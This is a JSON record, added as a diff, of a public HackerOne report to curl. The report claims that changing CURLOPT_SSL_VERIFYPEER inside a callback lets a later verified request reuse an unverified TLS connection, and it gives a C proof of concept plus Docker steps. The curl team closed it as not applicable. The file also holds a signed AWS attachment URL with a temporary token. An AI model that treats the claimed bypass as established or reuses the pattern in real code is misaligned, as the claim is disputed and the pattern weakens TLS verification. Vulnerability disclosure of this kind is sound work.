@@ -1,0 +1,116 @@
+{
+  "id": 3831432,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODMxNDMy",
+  "url": "https://hackerone.com/reports/3831432",
+  "title": "setopt(VERIFYPEER) from callback bypasses TLS verify on connection reuse",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "low",
+  "readable_substate": "N/A",
+  "created_at": "2026-06-29T12:43:00.211Z",
+  "submitted_at": "2026-06-29T12:43:00.516Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "a6b30108",
+    "url": "/a6b30108",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-30T11:03:53.505Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-30T11:03:52.809Z",
+  "team_member_agreed_on_going_public_at": "2026-06-30T10:21:12.393Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\n`Curl_ssl_conn_config_update` overwrites `conn->ssl_config.verifypeer` when `curl_easy_setopt(CURLOPT_SSL_VERIFYPEER, ...)` is called, with no handshake-state guard — only `if(data->conn)`. Since `setopt` is documented as callable from callbacks (`setopt.c:2930`), an application can connect with `verifypeer=0` (accepting a rogue cert), then flip to `verifypeer=1` inside a write callback. The mutation rewrites the pooled connection's `ssl_config.verifypeer` from 0 to 1, so a subsequent `verifypeer=1` request reuses the unverified TLS connection via `match_ssl_primary_config` (sees `1==1`) without a new handshake. The application reads `CURLINFO_SSL_VERIFYRESULT=0` (`X509_V_OK`, calloc default — never updated on reuse) and believes verification passed. A MITM with a rogue-signed cert captures the 2nd request's credentials.\n\n## Affected version\n\n```\ncurl 8.21.1-DEV (x86_64-pc-linux-gnu) libcurl/8.21.1-DEV OpenSSL/3.5.6 zlib/1.3.1\n```\n\nBug is in shared `lib/vtls/vtls_config.c:406-423`, not backend-specific. Reproduced on current master commit `cfc7922377`.\n\n## Steps To Reproduce:\n\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n\nstatic CURL *g;\nstatic int up;\n\nstatic size_t cb(char *p, size_t s, size_t n, void *u) {\n    if(!up++) curl_easy_setopt(g, CURLOPT_SSL_VERIFYPEER, 1L);\n    return s * n;\n}\n\nint main(void) {\n    curl_global_init(0);\n    CURLSH *sh = curl_share_init();\n    curl_share_setopt(sh, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);\n\n    /* 1st: verifypeer=0, accept rogue cert, upgrade to 1 in callback */\n    CURL *a = curl_easy_init();\n    g = a;\n    curl_easy_setopt(a, CURLOPT_URL, \"https://127.0.0.1:9443/1\");\n    curl_easy_setopt(a, CURLOPT_CAINFO, \"real_ca.crt\");\n    curl_easy_setopt(a, CURLOPT_SSL_VERIFYPEER, 0L);\n    curl_easy_setopt(a, CURLOPT_SSL_VERIFYHOST, 0L);\n    curl_easy_setopt(a, CURLOPT_WRITEFUNCTION, cb);\n    curl_easy_setopt(a, CURLOPT_SHARE, sh);\n    curl_easy_setopt(a, CURLOPT_NOSIGNAL, 1L);\n    curl_easy_perform(a);\n    curl_easy_cleanup(a);\n\n    /* 2nd: verifypeer=1, should reject but reuses a's unverified conn */\n    CURL *b = curl_easy_init();\n    curl_easy_setopt(b, CURLOPT_URL, \"https://127.0.0.1:9443/2\");\n    curl_easy_setopt(b, CURLOPT_CAINFO, \"real_ca.crt\");\n    curl_easy_setopt(b, CURLOPT_SSL_VERIFYPEER, 1L);\n    curl_easy_setopt(b, CURLOPT_SSL_VERIFYHOST, 0L);\n    curl_easy_setopt(b, CURLOPT_SHARE, sh);\n    curl_easy_setopt(b, CURLOPT_NOSIGNAL, 1L);\n    CURLcode rc = curl_easy_perform(b);\n\n    long vr = -1, nc = -1;\n    curl_easy_getinfo(b, CURLINFO_SSL_VERIFYRESULT, &vr);\n    curl_easy_getinfo(b, CURLINFO_NUM_CONNECTS, &nc);\n    printf(\"result=%d verify=%ld connects=%ld %s\\n\", rc, vr, nc,\n           (rc == 0 && nc == 0 && vr == 0) ? \"BYPASS\" : \"no-bypass\");\n\n    curl_easy_cleanup(b);\n    curl_share_cleanup(sh);\n    curl_global_cleanup();\n    return 0;\n}\n```\n\nSelf-contained Docker reproduction:\n\n```bash\ndocker build -t f5-setopt .\ndocker run --rm f5-setopt\n```\n\nExpected output:\n\n```\nresult=0 verify=0 connects=0 BYPASS\n```\n\n- `result=0` — 2nd request succeeded over rogue-signed TLS\n- `verify=0` — false `X509_V_OK` (calloc default, never updated on reuse)\n- `connects=0` — connection reused, no new handshake\n\nThe 0→1 upgrade is the only exploitable direction. Session cache is unaffected (`ssl_peer_key_add_vrfy` encodes `:NO-VRFY-PEER` at handshake time). `CURLOPT_SSL_VERIFYHOST` and `CURLOPT_SSL_VERIFYSTATUS` have the same bug (same `Curl_ssl_conn_config_update` call, same missing guard).\n\n## Impact\n\n## Summary:\n\nA `verifypeer=1` request silently reuses a TLS connection that was established without certificate chain verification. The application cannot detect this — `CURLINFO_SSL_VERIFYRESULT` returns `X509_V_OK` (calloc default, never updated on connection reuse), so it believes verification passed. If the reused connection was established to an attacker-controlled server (with `verifypeer=0`), subsequent requests' credentials and cookies flow over that connection while the application believes TLS is strictly verified.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6169699,
+      "file_name": "f5-setopt.tar.gz",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/60t22ksv16t3efa37u67t2ibuezi?response-content-disposition=attachment%3B%20filename%3D%22f5-setopt.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27f5-setopt.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYEOAPVBH%2F20260630%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260630T124048Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEPv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQChvMDXkinNc5BNkV0ra6gBy60SFS6j8gAMtLzD%2FAp15gIhAOjM0UpTiSz%2FHvISLy3wqRMTmGXAOwI01a02cN4s%2BJkEKroFCMT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwscYDXNtN9%2Bgk2ML4qjgWnbXqw1gojaEOxJFA5aIgyPshwwsI6C%2Bdm%2BrjMXtWsMVLr0Z%2Ffydw5Dir4JOrlYsAXqPiJm8M3IRiXJNrwXt8uQ8E5WvpqJ1pv1FiWyEUYkobpBPP%2FOg47UBv8axbMTsjedR5JT2yDIHwVGfCokwL4oBiYVvRfycooivku6%2F8c4leGlBaoQlVzI5tds62hB7kdJXGX85iNx4HrcP0Vky6d3dZ61XCmXLcjnjPvH78f8hJKuS%2BPVGfVvjV6Jn4I4ojqpCLvEm86tXEhPnFJwq12n5uGz6NbtvSg5JIWEgcTKqbj2%2FY7APimsc6f5srclYvWJ3q6rt%2F3c5%2BM9CIADFZSWss9O%2F%2BglxjBPEV1Sp%2BNNKnD90B%2BgBVS8OPDXIpNZiSatALl%2BFEz8reShYeX1RUSaLBmULNQE%2FGhFB4G5hzixWxgEtxWNlSPSCruIjwcMCVg0nNqSCDSbGyOc2sMQl31Vf8vMAsbj5MFqVSE%2FaZVDG9cVqo2KVEPDR7oGIquFKrVfqa4kaQEosuqceNqth0x%2FpEfrSK9uWJunKDuk3N1vtd4%2BL9YxOKOLrXsfTEDQgbwMNeFGzUCSjlifhLgrg5pr07FdBbehakd6oEmHmQc6aiyxP%2FperI8ozI6qEOt1YxCjj9R3aB5vSL%2Bi6nCChvfV%2FfkqiwVc2pGEZseCJGcVbkXAJuyqjef0Bt%2FdltCMTY4VSg6O5MVv0zbY8874pvRXsCW1pn0Y6Oy912UhISND7PsPsclbqh2iU6Tdd8e9NA34%2FuhrJ5bBjIbavj5XetfaDUM0o%2BQW3Imrb0IQgJJeJIwf6wA1esOPKtT2f90OCn5ecpGYjMvRiZvhgeA%2F9gL4MeQVJAkWaCPw2pG9Vwwm7WO0gY6sAFF54WGH491FjoISgjsl2U25EJDOaYGV%2BhO%2BSZ6Kmc2DT1yyJqEbbsCSafdPExmjwAz15fs2alHvMP5c0TA3SHb6JCyofrXE5xkssqkI19NY30%2BvGHuXhCF7UPUQ8AF9ws%2F2yIBM8%2BP785NPShC2WYXLIUeRqStI9CxqHRIZqivOKzISNrmT0jv9yE2S5XutgRW1%2F2UhIumxSfUcforknBdRsT3HAqonhcVZS0UXyk2%2Fg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0a3313db0df1b765708d107eb56fea49f1454003a261b413a89023438a678496",
+      "file_size": 3088,
+      "type": "application/gzip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
